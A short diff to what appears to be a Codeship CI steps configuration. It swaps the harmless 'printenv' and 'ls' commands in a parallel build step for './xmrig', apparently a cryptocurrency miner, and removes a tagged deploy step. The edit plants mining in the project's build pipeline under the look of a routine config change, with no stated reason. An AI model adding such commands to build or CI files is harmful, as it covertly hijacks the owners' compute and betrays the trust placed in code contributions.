@@ -2,10 +2,6 @@
   name: example_parallel_step
   steps:
     - service: codeship_example
-      command: printenv
+      command: ./xmrig
     - service: codeship_example
-      command: ls
-- name: example_tagged_step
-  tag: master
-  service: codeship_example
-  command: echo "Deploy here!"
+      command: ./xmrig
